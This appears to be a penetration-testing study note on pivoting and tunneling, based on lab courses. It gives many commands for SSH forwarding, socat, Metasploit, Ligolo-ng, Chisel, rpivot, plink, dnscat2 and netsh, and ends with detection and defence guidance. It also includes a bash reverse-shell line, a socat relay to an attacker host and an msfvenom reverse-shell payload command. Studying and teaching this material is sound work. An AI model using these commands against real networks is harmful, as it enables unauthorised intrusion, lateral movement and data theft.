---
title: "Pivoting, Tunneling & Port Forwarding"
type: technique
tags: [htb, lateral-movement, linux, network, pivoting, port-forwarding, thm, tunneling, windows]
phase: post-exploitation
date_created: 2026-05-08
date_updated: 2026-05-08
sources: [cpts-pivoting, thm-ad-lateral]
---

# Pivoting, Tunneling & Port Forwarding

## What It Is

After compromising an initial host, target networks are often segmented. The internal network is not directly reachable from the attacker's machine — only through the compromised host. **Pivoting** uses that compromised host as a relay to reach otherwise inaccessible hosts and services.

```
[Attacker] ──SSH/C2──▶ [Pivot Host / Jump Box] ──internal──▶ [Target Network]
  10.10.14.x              10.129.x.x / 172.16.x.x               172.16.5.x
```

Key use cases:
- Reaching internal web apps, SMB shares, RDP, or databases not exposed externally
- Lateral movement across network segments (DMZ → internal, workstation → server VLAN)
- Exfiltrating data through restricted egress paths
- Running tools (nmap scans, exploit modules) against hosts that are only reachable from inside

## Concepts

| Term | Meaning |
|---|---|
| **Pivot host** | Compromised machine used as a relay into a new network segment |
| **Jump host** | A host specifically configured to allow administrative access to internal hosts (bastion host); often the pivot target |
| **Agent** | Software running on the pivot host that creates tunnels (e.g. Meterpreter, Ligolo-ng agent, Chisel client) |
| **SOCKS proxy** | A generic proxy protocol (SOCKS4/SOCKS5) that forwards TCP/UDP connections — enables tools to route through a pivot |
| **proxychains** | Linux tool that forces any TCP-based tool through a SOCKS/HTTP proxy |
| **Forward tunnel** | Attacker-initiated: attacker connects outward through the pivot |
| **Reverse tunnel** | Pivot-initiated: compromised host connects back to attacker, bypassing inbound firewall rules |
| **Dynamic port forwarding** | Creates a local SOCKS proxy that dynamically routes to any destination |

### Network Ranges to Discover

On the pivot host, find what other networks it has access to:

```bash
# Linux
ifconfig
ip route
arp -a
cat /etc/hosts

# Windows
ipconfig /all
route print
arp -a
type C:\Windows\System32\drivers\etc\hosts
```

---

## Port Forwarding

Port forwarding creates a dedicated mapping: traffic arriving at a specific local port is forwarded to a specific remote host:port.

| Type | Direction | Use case |
|---|---|---|
| **Local** (`-L`) | Pull: remote service → local port | Access internal service from attacker machine |
| **Remote** (`-R`) | Push: local port → remote server | Expose attacker service to target network; bypasses inbound firewall |
| **Dynamic** (`-D`) | SOCKS proxy on local port | Route many tools through a pivot via proxychains |

---

## SSH Tunneling

SSH is the most common tunneling method because OpenSSH client ships on modern Windows (10/2019+) and nearly all Linux systems.

### Setup — Dedicated Tunnel User (Attacker Machine)

Create a user with no shell for inbound SSH tunnels from Windows pivot hosts:

```bash
useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser
# Ensure SSH server is running on attacker machine
systemctl enable --now ssh
```

---

### Local Port Forwarding (`ssh -L`)

Forwards a local port on the **attacker machine** to a service on a host reachable from the **SSH server** (the pivot).

```
[Attacker:localport] ──SSH──▶ [Pivot] ──TCP──▶ [InternalTarget:remoteport]
```

```bash
# From attacker machine — forward attacker's 1234 to internal host 172.16.5.25:3306
ssh -L 1234:172.16.5.25:3306 ubuntu@10.129.202.64

# Then access the forwarded port locally
mysql -u root -p -h 127.0.0.1 -P 1234

# Forward to internal web server
ssh -L 8080:172.16.5.25:80 ubuntu@10.129.202.64
# Browse http://127.0.0.1:8080

# Multiple forwards in one command
ssh -L 1234:172.16.5.25:3306 -L 8080:172.16.5.25:80 ubuntu@10.129.202.64

# Non-interactive (background tunnel, no shell)
ssh -L 1234:172.16.5.25:3306 ubuntu@10.129.202.64 -N -f
```

**THM variant** — exposing attacker service to a target network via a Windows pivot:

```bash
# On PC-1 (Windows pivot) — makes attacker's port 80 available on PC-1's port 80
ssh tunneluser@<attacker-ip> -L *:80:127.0.0.1:80 -N
# Open firewall rule on PC-1 if needed
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
```

---

### Remote Port Forwarding (`ssh -R`)

Pivot host connects **out** to attacker's SSH server and opens a port **on the attacker** that maps back to a service inside the target network. Bypasses inbound firewall rules on the pivot.

```
[InternalTarget:port] ◀──TCP── [Pivot] ──SSH──▶ [Attacker:remoteport]
```

```bash
# On pivot host — expose 172.16.5.25:3306 as port 8080 on attacker machine
ssh -R 8080:172.16.5.25:3306 ubuntu@<attacker-ip> -vN

# From Windows pivot — expose internal RDP (3.3.3.3:3389) as port 3389 on attacker
ssh tunneluser@<attacker-ip> -R 3389:3.3.3.3:3389 -N

# Then from attacker machine connect normally
xfreerdp3 /v:127.0.0.1 /u:Administrator /p:Password123
```

For remote forwards to listen on all interfaces (not just loopback), set in `/etc/ssh/sshd_config` on attacker:

```
GatewayPorts yes
```

Then restart: `systemctl restart sshd`

---

### Dynamic Port Forwarding + proxychains (`ssh -D`)

Creates a **SOCKS proxy** on a local port. All traffic sent to that port is forwarded through the SSH connection and the pivot host routes it to any destination.

```bash
# From attacker machine — SOCKS proxy on local port 9050
ssh -D 9050 ubuntu@10.129.202.64 -N -f

# Reverse dynamic (from Windows pivot back to attacker's SSH server)
ssh tunneluser@<attacker-ip> -R 9050 -N
```

Configure proxychains (`/etc/proxychains.conf`):

```
[ProxyList]
socks5  127.0.0.1 9050
```

Use any tool through the pivot:

```bash
proxychains nmap -v -sn 172.16.5.1-254 --open          # host discovery
proxychains nmap -v -Pn -sT 172.16.5.25 -p 80,443,3389 # TCP scan (no ICMP)
proxychains msfconsole                                   # route MSF through proxy
proxychains crackmapexec smb 172.16.5.0/24              # SMB sweep
proxychains xfreerdp /v:172.16.5.25 /u:Administrator    # RDP through pivot
proxychains curl http://172.16.5.25/                    # web app through pivot
proxychains ssh -i id_rsa ubuntu@172.16.5.25            # double pivot — SSH again
```

> **Note:** nmap ICMP ping (`-sn`) and SYN scans (`-sS`) do not work through SOCKS. Always use `-Pn -sT` for TCP scanning through proxychains.

---

### SSH over Scanned Hosts (Pivoting to a Second Hop)

When you gain shell on a second internal host, you can pivot again:

```bash
# On pivot-1 shell — forward attacker's 2222 to pivot-2's SSH port
ssh -L 2222:172.16.5.25:22 ubuntu@10.129.202.64 -N -f

# Now SSH to pivot-2 through forwarded port
ssh -i id_rsa_pivot2 ubuntu@127.0.0.1 -p 2222
```

---

## Socat Port Relay

socat is a general-purpose relay tool. Useful when SSH is unavailable on the pivot host. Does not create an encrypted tunnel.

```bash
# Transfer socat to pivot host first (see [[file-transfer]])

# Relay: connections to pivot:8080 are forwarded to 172.16.5.25:80
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.25:80

# Relay to RDP on an internal host
socat TCP4-LISTEN:3389,fork TCP4:172.16.5.25:3389

# Relay attacker's listener to a target (reverse shell relay through pivot)
socat TCP4-LISTEN:8443,fork TCP4:<attacker-ip>:8443

# Windows — open firewall rule before listening
netsh advfirewall firewall add rule name="Open Port 8080" dir=in action=allow protocol=TCP localport=8080
```

**Socat reverse shell relay:** if a target can only reach the pivot, not the attacker:

```
[Target] ──rev shell──▶ [Pivot:8443] ──socat──▶ [Attacker:8443]
```

```bash
# On pivot
socat TCP4-LISTEN:8443,fork TCP4:<attacker-ip>:8443

# On attacker — catch the shell
nc -lvnp 8443

# On target — trigger reverse shell to pivot
bash -i >& /dev/tcp/<pivot-ip>/8443 0>&1
```

---

## Metasploit Pivoting

### Route-Based Pivoting (autoroute)

After getting a Meterpreter session on a pivot host:

```bash
# Method 1 — background session and use post module
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
set NETMASK 255.255.255.0
run

# Method 2 — from within Meterpreter session
run autoroute -s 172.16.5.0/23

# Method 3 — from msf console
route add 172.16.5.0/23 1    # 1 = session number
route print
route flush                   # remove all routes
```

After adding a route, Metasploit modules targeting 172.16.5.x will route through the Meterpreter session automatically.

```bash
# Scan through the route
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.5.1-254
set PORTS 22,80,443,445,3389
run
```

### SOCKS Proxy via Metasploit

```bash
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 9050
set VERSION 5          # SOCKS5; use 4a for SOCKS4
run -j                 # run as background job
```

Then use proxychains with that port — routing goes through the MSF route (Meterpreter session).

### Meterpreter portfwd

Forward a single port through the Meterpreter session:

```bash
# In Meterpreter — forward attacker's 3300 to 172.16.5.25:3389
portfwd add -l 3300 -p 3389 -r 172.16.5.25

# List active forwards
portfwd list

# Delete a forward
portfwd delete -l 3300 -p 3389 -r 172.16.5.25

# Flush all forwards
portfwd flush
```

Then from attacker: `xfreerdp /v:localhost:3300 /u:Administrator`

### Reverse portfwd (Meterpreter)

Expose a port on the pivot host that connects back through the session to attacker's listener — useful for catching reverse shells from deeper internal hosts:

```bash
# In Meterpreter — listen on pivot's 8081, forward to attacker's 8081
portfwd add -R -l 8081 -p 8081 -L <attacker-ip>

# Create payload pointing to pivot's IP
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<pivot-ip> LPORT=8081 -f exe -o reverse.exe

# Set handler on attacker
use exploit/multi/handler
set LHOST 0.0.0.0
set LPORT 8081
run
```

---

## Ligolo-ng

Ligolo-ng is a modern, fast tunneling tool using a TUN interface. Traffic is routed transparently — tools run as if the internal network were directly connected; no proxychains needed.

### Architecture

```
[Attacker: proxy binary] ◀──TLS──▶ [Pivot: agent binary]
Attacker gets a tun interface → routes to internal subnet
```

### Setup (Attacker)

```bash
# Download from https://github.com/nicocha30/ligolo-ng/releases
# Create TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Start proxy (listens for agent connections)
./proxy -selfcert
# or with legitimate cert
./proxy -certfile cert.pem -keyfile key.pem
```

### Deploy Agent on Pivot

```bash
# Linux pivot
./agent -connect <attacker-ip>:11601 -ignore-cert

# Windows pivot
agent.exe -connect <attacker-ip>:11601 -ignore-cert
```

### Configure Route and Start Tunnel

```bash
# In ligolo-ng proxy console
session                     # list connected agents
# select the agent

# Add route on attacker machine to internal subnet via tun interface
sudo ip route add 172.16.5.0/24 dev ligolo

# In ligolo-ng console — start the tunnel
start
```

Now: `nmap -Pn -sV 172.16.5.25 -p 80,443` works directly without proxychains.

### Ligolo-ng — Accessing Pivot Host's Ports

To reach a service on the pivot host itself (e.g. pivot:1234):

```bash
# In ligolo-ng console — add a listener on agent
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:1234
```

### Double Pivot with Ligolo-ng

```bash
# On pivot-2 (reached via pivot-1's tunnel), deploy agent pointing to attacker
./agent -connect <attacker-ip>:11601 -ignore-cert

# New session appears in proxy console
# Add route for pivot-2's internal subnet
sudo ip route add 10.10.10.0/24 dev ligolo
# Re-select pivot-2 session in console and start
start
```

---

## Chisel

Chisel is an HTTP/HTTPS-based SOCKS proxy and port forwarder — useful when only HTTP is allowed through firewalls.

### Server (Attacker)

```bash
# Download from https://github.com/jpillora/chisel/releases
./chisel server -v -p 1080 --reverse
```

### Client (Pivot Host)

```bash
# Linux pivot — reverse SOCKS proxy on attacker's 1080
./chisel client <attacker-ip>:1080 R:socks

# Windows pivot
chisel.exe client <attacker-ip>:1080 R:socks

# Single port forward (reverse) — attacker's 8080 → internal 172.16.5.25:80
./chisel client <attacker-ip>:1080 R:8080:172.16.5.25:80
```

Configure proxychains for SOCKS5 port 1080:

```
[ProxyList]
socks5  127.0.0.1 1080
```

```bash
proxychains nmap -Pn -sT 172.16.5.25 -p 80,443,3389
```

### Chisel — Local (Bind) Mode

```bash
# Server on pivot (bind)
./chisel server -v -p 8080 --socks5

# Client on attacker — connects to pivot's chisel server
./chisel client <pivot-ip>:8080 socks
```

---

## rpivot

rpivot creates a reverse SOCKS4 proxy. The agent runs on the pivot and connects back to the attacker's server.

```bash
# On attacker — start server (SOCKS proxy on port 9050)
python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# On pivot host
python2 client.py --server-ip <attacker-ip> --server-port 9999
```

NTLM-authenticated HTTP proxy (corporate environments):

```bash
python2 client.py --server-ip <attacker-ip> --server-port 9999 \
  --ntlm-proxy-ip <proxy-ip> --ntlm-proxy-port 8080 \
  --domain CORP --username jsmith --password Pass123
```

Configure proxychains for SOCKS4 port 9050, then use normally.

---

## plink.exe (Windows SSH)

plink.exe is the CLI SSH client from PuTTY — useful when Windows doesn't have the OpenSSH client (pre-2019 systems).

```cmd
# Remote dynamic port forward — SOCKS proxy on attacker's 9050
plink.exe -ssh -l tunneluser -pw <password> <attacker-ip> -R 9050 -N

# Remote single port forward
plink.exe -ssh -l tunneluser -pw <password> <attacker-ip> -R 3389:172.16.5.25:3389 -N

# Accept host key automatically (non-interactive)
echo y | plink.exe -ssh -l tunneluser -pw <password> <attacker-ip> -R 9050 -N
```

> plink.exe can be downloaded from https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html and transferred to the target.

---

## dnscat2

dnscat2 tunnels data through DNS queries — bypasses strict egress filtering that blocks TCP/UDP but allows DNS.

```bash
# On attacker — start dnscat2 server
ruby dnscat2.rb --dns host=<attacker-ip>,port=53,domain=<domain> --no-cache

# On pivot (Linux)
./dnscat --secret=<secret> <domain>

# Windows pivot
dnscat2-v0.07-client-win32.exe --secret <secret> <domain>
```

In server console once connected:

```bash
window -i 1                     # interact with session
exec cmd.exe                    # Windows shell
listen 127.0.0.1:8080 172.16.5.25:80   # port forward
```

---

## Netsh (Windows Built-in Port Forward)

Windows' built-in port proxy — no extra tools needed, requires Administrator:

```cmd
# Forward connections to this host's port 8080 → 172.16.5.25:80
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.5.25

# View active port proxies
netsh interface portproxy show v4tov4

# Delete a rule
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0

# Firewall rule to allow inbound on the listening port
netsh advfirewall firewall add rule name="Pivot 8080" dir=in action=allow protocol=TCP localport=8080
```

---

## proxychains Configuration

`/etc/proxychains.conf` (or `/etc/proxychains4.conf`):

```ini
# Strict chain — all proxies must be reachable (used for chains)
strict_chain
# dynamic_chain  # skip dead proxies

# Proxy DNS requests through the proxy
proxy_dns

# Timeout
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5  127.0.0.1 9050    # for SSH -D or MSF socks_proxy
# socks4  127.0.0.1 9050  # for older tools / rpivot
# http    127.0.0.1 8080  # for HTTP CONNECT proxy
```

**Chaining proxies (double pivot):**

```ini
strict_chain

[ProxyList]
socks5  127.0.0.1 9050    # first hop (pivot-1)
socks5  127.0.0.1 9051    # second hop (pivot-2)
```

Tool usage patterns:

```bash
proxychains -q nmap -Pn -sT -p 22,80,443,445,3389 172.16.5.25   # -q = quiet
proxychains ssh -i id_rsa user@172.16.5.25
proxychains msfconsole
proxychains python3 exploit.py
proxychains curl -s http://172.16.5.25/
proxychains impacket-smbclient //172.16.5.25/share -U Administrator%Pass123
proxychains impacket-wmiexec Administrator:'Pass123'@172.16.5.25
```

---

## Double / Triple Pivoting

Chaining pivot hosts to reach deeply nested network segments.

```
[Attacker] → [Pivot-1: 10.129.x.x / 172.16.5.x] → [Pivot-2: 172.16.5.x / 10.10.10.x] → [Target: 10.10.10.x]
```

### Method 1: SSH -D chain

```bash
# Tunnel to pivot-1, SOCKS on 9050
ssh -D 9050 ubuntu@10.129.202.64 -N -f

# Through proxychains (via 9050), SSH to pivot-2 with SOCKS on 9051
proxychains ssh -D 9051 ubuntu@172.16.5.25 -N -f

# proxychains.conf — dynamic_chain with both hops
dynamic_chain
[ProxyList]
socks5  127.0.0.1 9050
socks5  127.0.0.1 9051
```

### Method 2: Metasploit multi-hop autoroute

```bash
# Session 1 on pivot-1 → route for 172.16.5.0/24 via session 1
route add 172.16.5.0/24 1

# Exploit pivot-2 via session 1's route → get session 2
# Route deeper subnet via session 2
route add 10.10.10.0/24 2

# Both routes active — MSF modules now reach 10.10.10.x
```

### Method 3: Ligolo-ng multi-session

Each agent connects to the same proxy binary. Add different routes for each session and start each tunnel independently.

---

## Detection and Defence

| Technique | Detection signals |
|---|---|
| SSH tunnels | Unusual outbound SSH from workstations; SSH sessions that open no shell (flag `-N`); long-lived SSH sessions |
| Socat | Unexpected listening ports; socat binary on hosts; network flows with relay patterns |
| Ligolo-ng / Chisel | TLS connections to non-standard ports; unusual TUN interface creation |
| Meterpreter portfwd | Meterpreter sessions; memory injection indicators |
| DNS tunneling | High DNS query rate; unusually long TXT/CNAME queries; queries to external resolvers |
| netsh portproxy | `netsh interface portproxy show all`; check registry `HKLM\SYSTEM\CurrentControlSet\Services\PortProxy` |
| proxychains | Tool-level; look for proxy-aware connection patterns, SOCKS traffic on unexpected ports |

**Defensive controls:**
- Enforce host-based firewalls; deny outbound SSH from workstations to internet
- Monitor for new listening ports (`ss -tlnp`, `netstat -anp`)
- Network segmentation with deny-by-default inter-VLAN policies
- Deception (honeypots on internal segments)
- Detect anomalous DNS volume via SIEM/DNS analytics
- Endpoint detection for unusual TUN interface creation or port proxy rules

---

## Tools

- [[metasploit]] — autoroute, socks_proxy, portfwd
- [[wiki/tools/nmap]] — scanning through proxychains
- OpenSSH (`ssh`) — built-in tunneling
- socat — port relay
- Ligolo-ng — transparent TUN tunneling
- Chisel — HTTP-based SOCKS proxy
- rpivot — reverse SOCKS4 proxy
- plink.exe — PuTTY SSH client for Windows
- dnscat2 — DNS tunneling
- netsh — Windows built-in port proxy
- proxychains — force tools through SOCKS/HTTP proxy

---

## Sources

- HTB Academy — CPTS: Pivoting, Tunneling & Port Forwarding (Module 12)
- TryHackMe — AD Lateral Movement: Port Forwarding
- Ligolo-ng: https://github.com/nicocha30/ligolo-ng
- Chisel: https://github.com/jpillora/chisel
- rpivot: https://github.com/klsecservices/rpivot
- dnscat2: https://github.com/iagox86/dnscat2
